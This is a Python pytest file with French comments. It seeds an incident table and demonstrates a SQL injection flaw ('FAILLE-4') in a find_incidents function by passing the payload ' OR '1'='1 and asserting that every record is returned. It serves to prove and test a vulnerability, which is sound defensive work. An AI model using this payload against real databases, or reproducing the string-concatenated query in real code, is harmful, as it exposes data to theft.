import pytest
from queenbee import conn, find_incidents


@pytest.fixture(autouse=True)
def setup_database():
  """Prépare la base de données en mémoire avec des données de test."""
  # Nettoyage et insertion de données fictives
  conn.execute("DELETE FROM incident")
  conn.execute(
      "INSERT INTO incident (id, ip, status) VALUES (1, '192.168.1.1',"
      " 'open')"
  )
  conn.execute(
      "INSERT INTO incident (id, ip, status) VALUES (2, '10.0.0.5', 'closed')"
  )
  conn.execute(
      "INSERT INTO incident (id, ip, status) VALUES (3, '172.16.0.2',"
      " 'open')"
  )
  conn.commit()


def test_faille_4_sql_injection_exploitation():
  """Prouve la FAILLE-4 : Injection SQL via concaténation de chaînes (f-string)."""
  # 1. Comportement normal attendu : la recherche d'une IP spécifique renvoie 1 seul résultat
  normal_results = find_incidents("192.168.1.1")
  assert len(normal_results) == 1

  # 2. Charge utile d'injection SQL : ' OR '1'='1
  # La requête exécutée devient : SELECT * FROM incident WHERE ip = '' OR '1'='1'
  sql_payload = "' OR '1'='1"

  # 3. Exécution de l'attaque
  compromised_results = find_incidents(sql_payload)

  # 4. Preuve de la faille : l'attaquant récupère TOUS les incidents de la base
  # au lieu d'un résultat vide ou ciblé.
  assert (
      len(compromised_results) == 3
  ), "L'injection SQL a échoué, tous les enregistrements n'ont pas été exfiltrés."

  # Vérification que des données non ciblées (ex: IP 10.0.0.5) ont été retournées
  ips_exfiltrées = [row[1] for row in compromised_results]
  assert "10.0.0.5" in ips_exfiltrées
